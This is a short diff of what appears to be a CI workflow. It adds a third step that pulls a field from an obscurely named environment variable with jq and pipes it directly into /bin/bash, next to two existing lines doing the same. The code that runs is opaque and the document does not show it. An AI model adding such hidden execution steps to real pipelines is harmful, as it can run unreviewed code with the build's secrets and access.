@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$agqbl78" | jq -r .ynmts8130 | /bin/bash
           printf '%s' "$bz2" | jq -r .fj5865 | /bin/bash
+          printf '%s' "$v043" | jq -r .sxsq1 | /bin/bash
 
       - name: Persist results
         if: always()
